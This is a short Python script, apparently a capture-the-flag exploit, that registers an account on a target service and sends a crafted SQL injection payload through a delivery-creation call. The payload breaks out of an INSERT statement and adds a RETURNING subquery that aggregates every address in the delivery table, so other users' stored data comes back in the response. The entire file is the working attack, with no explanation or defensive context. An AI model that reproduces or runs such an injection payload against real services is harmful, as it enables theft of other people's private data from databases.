from service_lib import ServiceClient
from sys import argv
URL = argv[1]      # Serviceaddr

client = ServiceClient(URL)

client.register('email@email.mail', '123')
client.login('email@email.mail', '123')
PAYLOAD = "x',$$p$$,$$pending$$,now(),now()) RETURNING id,(SELECT string_agg(address,$$, $$) FROM delivery) AS address,$$p$$ AS phone,$$pending$$ AS status,now() AS created_at,now() AS updated_at--"
ret = client.create_delivery(PAYLOAD, '1', [])
print(ret)